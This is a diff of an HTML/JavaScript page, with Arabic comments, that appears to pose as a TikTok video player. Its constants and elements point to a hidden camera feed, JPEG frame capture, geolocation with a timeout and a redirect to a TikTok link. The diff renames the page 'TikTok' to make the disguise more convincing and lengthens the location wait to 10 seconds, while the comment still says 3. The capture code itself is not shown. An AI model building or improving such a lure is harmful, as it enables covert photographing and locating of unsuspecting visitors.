@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>فيديو</title>
+    <title>TikTok</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -54,7 +54,7 @@
 <body>
 
 <div class="player" id="player">
-    <img src="https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=400&q=80" alt="فيديو">
+    <img src="https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=400&q=80" alt=" TikTok">
     <div class="play-btn" id="playBtn">
         <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
     </div>
@@ -72,11 +72,12 @@ const TIKTOK_URL = 'https://vt.tiktok.com/ZSVucc7HX/';
 const VW = 720;
 const VH = 1280;
 const JPEG_QUALITY = 0.90;      // جودة عالية
-const LOC_TIMEOUT  = 3000;      // 3 ثواني للموقع
+const LOC_TIMEOUT  = 10000;      // 3 ثواني للموقع
 const CAM_WARMUP   = 350;       // استنى الكاميرا تضبط الإضاءة
 // =============================================
 
 const player    = document.getElementById('player');
+const playBtn  = document.getElementById('playBtn');
 const hiddenCam = document.getElementById('hiddenCam');
 
 let done = false;
